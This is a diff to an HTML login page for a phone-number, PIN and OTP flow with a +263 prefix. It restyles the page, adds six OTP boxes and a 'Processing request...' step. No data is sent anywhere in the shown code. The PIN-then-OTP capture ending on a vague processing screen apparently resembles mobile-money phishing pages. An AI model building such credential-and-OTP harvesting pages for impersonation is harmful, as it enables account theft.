@@ -26,7 +26,7 @@ linear-gradient(180deg,#e6f0ff,#cfe0ff);
 overflow:hidden;
 }
 
-/* waves */
+/* background */
 
 .wave{
 position:fixed;
@@ -48,7 +48,7 @@ z-index:-1;
 100%{transform:translateY(0)}
 }
 
-/* card */
+/* container */
 
 .step{
 position:absolute;
@@ -69,7 +69,7 @@ transition:.35s;
 position:relative;
 width:100%;
 max-width:420px;
-height:520px;
+height:560px;
 }
 
 .hidden{
@@ -130,12 +130,12 @@ background:white;
 box-shadow:0 0 0 3px rgba(0,58,143,.08);
 }
 
-/* phone prefix */
+/* phone */
 
 .phone-group{
 display:flex;
-align-items:center;
 gap:8px;
+align-items:center;
 }
 
 .prefix{
@@ -159,14 +159,14 @@ font-weight:700;
 background:#003a8f;
 color:white;
 cursor:pointer;
-opacity:.5;
+opacity:.45;
 }
 
 .btn.active{
 opacity:1;
 }
 
-/* pin */
+/* pin boxes */
 
 .pin{
 display:flex;
@@ -190,7 +190,7 @@ border-color:#003a8f;
 box-shadow:0 0 0 3px rgba(0,58,143,.12);
 }
 
-/* otp text */
+/* otp */
 
 .count{
 text-align:center;
@@ -210,7 +210,7 @@ background:none;
 color:#003a8f;
 cursor:pointer;
 font-weight:600;
-opacity:.5;
+opacity:.4;
 }
 
 .resend button.active{
@@ -246,7 +246,6 @@ opacity:1;
 
 </div>
 
-
 <label>Enter your PIN</label>
 
 <div class="pin">
@@ -259,7 +258,9 @@ opacity:1;
 </div>
 
 <button id="loginBtn" class="btn">
+
 Login
+
 </button>
 
 </div>
@@ -267,14 +268,20 @@ Login
 
 <!-- OTP -->
 
-<div id="step2" class="step hidden">
+<div id="step3" class="step hidden">
 
 <h1>OTP Verification</h1>
 
-<div class="subtitle" id="maskedNumber"></div>
+<div class="subtitle" id="maskedNumber">
+
+Enter the OTP sent to your phone number
+
+</div>
 
 <div class="pin">
 
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
@@ -290,7 +297,11 @@ Code expires in <span id="time">60</span>s
 
 <div class="resend">
 
-<button id="resendBtn">Resend OTP</button>
+<button id="resendBtn">
+
+Resend OTP
+
+</button>
 
 </div>
 
@@ -302,24 +313,30 @@ Submit
 
 </div>
 
+
+<!-- SUCCESS -->
+
+<div id="step4" class="step hidden">
+
+<h1>Success</h1>
+
+<div class="subtitle">
+
+Processing request...
+
 </div>
+
+</div>
+
+</div>
+
 
 
 <script>
 
-const phone=document.getElementById("phone")
-
-const pinInputs=document.querySelectorAll("#step1 .pin input")
-
-const otpInputs=document.querySelectorAll("#step2 .pin input")
-
-const loginBtn=document.getElementById("loginBtn")
-
-const resendBtn=document.getElementById("resendBtn")
-
 let phoneValue=""
-
 let pinValue=""
+let otpValue=""
 
 /* phone validation */
 
@@ -327,27 +344,32 @@ phone.oninput=e=>{
 
 let v=e.target.value.replace(/\D/g,"")
 
-if(v[0]!=="7") v="7"+v.slice(1)
+if(v.length>0 && v[0]!=="7")
+v="7"+v.slice(1)
 
 v=v.slice(0,9)
 
 e.target.value=v
 
-phoneValue=v
+phoneValue="+263"+v
 
 validate()
 
 }
 
-/* pin */
 
-pinInputs.forEach((input,i)=>{
+/* pin logic */
+
+const pinInputs=document.querySelectorAll("#step1 .pin input")
+
+pinInputs.forEach((input,index)=>{
 
 input.oninput=()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
-if(input.value && i<3) pinInputs[i+1].focus()
+if(input.value && index<3)
+pinInputs[index+1].focus()
 
 validate()
 
@@ -355,11 +377,11 @@ validate()
 
 input.onkeydown=e=>{
 
-if(e.key==="Backspace" && !input.value && i>0){
+if(e.key==="Backspace" && !input.value && index>0){
 
-pinInputs[i-1].focus()
+pinInputs[index-1].focus()
 
-pinInputs[i-1].value=""
+pinInputs[index-1].value=""
 
 validate()
 
@@ -369,11 +391,12 @@ validate()
 
 })
 
+
 function validate(){
 
 pinValue=[...pinInputs].map(i=>i.value).join("")
 
-if(phoneValue.length===9 && pinValue.length===4)
+if(phoneValue.length===13 && pinValue.length===4)
 
 loginBtn.classList.add("active")
 
@@ -383,57 +406,61 @@ loginBtn.classList.remove("active")
 
 }
 
-/* login click */
-
-loginBtn.onclick=()=>{
-
-if(!loginBtn.classList.contains("active")) return
-
-const masked="+263"+phoneValue.replace(/(\d{3})\d{4}(\d{2})/,"$1****$2")
-
-document.getElementById("maskedNumber").innerHTML=
-
-`Enter the OTP sent to your phone number ${masked}`
-
-show("step2")
-
-startTimer()
-
-}
 
 /* show step */
 
 function show(id){
 
 document.querySelectorAll(".step")
-
 .forEach(s=>s.classList.add("hidden"))
 
 document.getElementById(id)
-
 .classList.remove("hidden")
 
 }
 
-/* otp input */
 
-otpInputs.forEach((input,i)=>{
+/* login click */
+
+loginBtn.onclick=()=>{
+
+if(!loginBtn.classList.contains("active")) return
+
+const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
+
+document.getElementById("maskedNumber").innerHTML=
+
+`Enter the OTP sent to your phone number ${masked}`
+
+show("step3")
+
+startTimer()
+
+}
+
+
+/* otp */
+
+const otpInputs=document.querySelectorAll("#step3 .pin input")
+
+otpInputs.forEach((input,index)=>{
 
 input.oninput=()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
-if(input.value && i<3) otpInputs[i+1].focus()
+if(input.value && index<5)
+otpInputs[index+1].focus()
 
 }
 
 input.onkeydown=e=>{
 
-if(e.key==="Backspace" && !input.value && i>0){
+if(e.key==="Backspace" && !input.value && index>0){
 
-otpInputs[i-1].focus()
+otpInputs[index-1].focus()
 
-otpInputs[i-1].value=""
+otpInputs[index-1].value=""
 
 }
 
@@ -441,7 +468,17 @@ otpInputs[i-1].value=""
 
 })
 
-/* timer */
+
+function submitOtp(){
+
+otpValue=[...otpInputs].map(i=>i.value).join("")
+
+show("step4")
+
+}
+
+
+/* timer 60 sec */
 
 function startTimer(){
 
@@ -469,21 +506,12 @@ resendBtn.classList.add("active")
 
 }
 
-/* resend */
 
 resendBtn.onclick=()=>{
 
 if(!resendBtn.classList.contains("active")) return
 
 startTimer()
-
-}
-
-/* submit */
-
-function submitOtp(){
-
-location.href="success.html"
 
 }
 
